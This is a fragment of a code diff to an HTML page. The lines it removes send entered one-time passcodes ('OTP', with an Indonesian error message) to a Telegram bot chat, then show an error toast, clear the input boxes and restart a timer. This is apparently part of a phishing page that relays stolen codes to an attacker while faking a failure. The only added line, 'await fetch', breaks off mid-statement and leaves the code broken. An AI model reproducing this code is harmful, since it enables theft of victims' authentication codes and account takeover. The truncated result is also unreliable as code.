@@ -340,27 +340,4 @@
       const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
       try {
-        await fetch(telegramUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: messageText,
-            parse_mode: 'Markdown'
-          })
-        });
-      } catch (err) {
-        console.error('Gagal kirim OTP:', err);
-      }
-
-      errorToast.classList.add('show');
-      
-      setTimeout(() => {
-        inputs.forEach(input => input.value = '');
-        inputs[0].focus();
-        startTimer();
-      }, 1500);
-    }
-  </script>
-</body>
-</html>
+        await fetch
